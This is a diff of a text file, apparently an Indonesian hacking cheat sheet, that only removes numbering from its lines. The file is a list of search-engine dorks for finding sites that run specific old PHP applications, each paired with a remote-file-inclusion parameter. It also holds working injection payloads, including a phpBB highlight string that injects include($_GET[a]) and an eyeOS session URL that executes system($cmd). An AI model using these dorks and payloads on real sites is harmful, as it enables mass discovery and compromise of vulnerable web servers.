@@ -2825,66 +2825,66 @@ INURL OR INURL WITH:
 /main.php?view=
 /modules/PNphpBB2/includes/functions_admin.php?phpbb_root_path=
 /index.php?file=
-1. my_egery site:.org
-2. xgery site:.org
-3. coppermine site:.org
-4. 4nAlbum site:.org
+my_egery site:.org
+xgery site:.org
+coppermine site:.org
+4nAlbum site:.org
 /modules/4nAlbum/public/displayCategory.php?basepath=
-5. inurlP:NphpBB2 site:.org
-6. ihm.php?p=
-7. Keyword : “powered by MyLinks”
-8. /modules.php?name=myguests
+inurlP:NphpBB2 site:.org
+ihm.php?p=
+Keyword : “powered by MyLinks”
+/modules.php?name=myguests
 /modules/MyGuests/signin.php?_AMGconfig[cfg_serverpath]=
-9. /Popper/index.php?
+/Popper/index.php?
 /Popper/index.php?childwindow.inc.php?form=
-10. google = kietu/hit_js.php, kietu/hit_js.php
+google = kietu/hit_js.php, kietu/hit_js.php
 yahoo = by Kietu? v 3.2
 /kietu/index.php?kietu[url_hit]=
-11. keyword : “Powered by phpBB 2.0.6”
+keyword : “Powered by phpBB 2.0.6”
 /html&highlight=%2527.include($_GET[a]),exit.%2527&a=
-12. keyword : “powered by CubeCart 3.0.6”
-13. keyword : “powered by paBugs 2.0 Beta 3”
-14. powered by AshNews”, AshNews atau  /ashnews.php
-15. keyword : /phorum/login.php
+keyword : “powered by CubeCart 3.0.6”
+keyword : “powered by paBugs 2.0 Beta 3”
+powered by AshNews”, AshNews atau  /ashnews.php
+keyword : /phorum/login.php
 /phorum/plugin/replace/plugin.php?PHORUM[settings_dir]=
-16. ihm.php?p=*
-14. keyword : “powered eyeOs”
+ihm.php?p=*
+keyword : “powered eyeOs”
 /eyeos/desktop.php?baccio=eyeOptions.eyeapp&a=eyeOptions.eyeapp&_SESSION%5busr%5d=root&_SESSION%5bapps%5d%5beyeOptions.eyeapp%5d%5bwrapup%5d=system($cmd);&cmd=id
 diganti dengan :
 /eyeos/desktop.php?baccio=eyeOptions.eyeapp&a=eyeOptions.eyeapp&_SESSION%5busr%5d=root&_SESSION%5bapps%5d%5beyeOptions.eyeapp%5d%5bwrapup%5d=include($_GET%5ba%5d);&a=
-15. .php?bodyfile=
-16. /includes/orderSuccess.inc.php?glob=
-17. forums.html
+.php?bodyfile=
+/includes/orderSuccess.inc.php?glob=
+forums.html
 /modules.php?name=
-18. /default.php?page=home
-19. /folder.php?id=
-20. main.php?pagina=
+/default.php?page=home
+/folder.php?id=
+main.php?pagina=
 /paginedinamiche/main.php?pagina=
-21. Key Word: ( Nuke ET Copyright 2004 por Truzone. ) or ( *.edu.*/modules.php?name=myguests ) or ( “powered by MyGuests”)
-22. application.php?base_path=
+Key Word: ( Nuke ET Copyright 2004 por Truzone. ) or ( *.edu.*/modules.php?name=myguests ) or ( “powered by MyGuests”)
+application.php?base_path=
 /application.php?base_path=
-23. inurlp:hplivehelper
+inurlp:hplivehelper
 /phplivehelper/initiate.php?abs_path=
-24. inurlp:hpnuke
-25. key word : “powered by Fantastic News v2.1.2”
+inurlp:hpnuke
+key word : “powered by Fantastic News v2.1.2”
 /archive.php?CONFIG[script_path]=
-26. keyword: “powered by smartblog” AND ?page=login
-27. /forum/
+keyword: “powered by smartblog” AND ?page=login
+/forum/
 /forum/admin/index.php?inc_conf=
-28. keyword:”Powered By FusionPHP”
+keyword:”Powered By FusionPHP”
 /templates/headline_temp.php?nst_inc=
-29. shoutbox/expanded.php filetypep:hp
-30.  /osticket/
+shoutbox/expanded.php filetypep:hp
+/osticket/
 /osticket/include/main.php?config[search_disp]=true&include_dir=
-31. keyword : “Powered by iUser”
+keyword : “Powered by iUser”
 /common.php?include_path=
-32.  “static.php?load=”
+“static.php?load=”
 /static.php?load=
-33. keyworld : /phpcoin/login.php
+keyworld : /phpcoin/login.php
 /phpcoin/config.php?_CCFG[_PKG_PATH_DBSE]=
-34. keyworld: /phpGedview/login.php site:
+keyworld: /phpGedview/login.php site:
 /help_text_vars.php?dir&PGV_BASE_DIRECTORY=
-35. /folder.php?id=
+/folder.php?id=
 /classes.php?LOCAL_PATH=
 “/lire.php?rub=”
 “/os/pointer.php?url=”
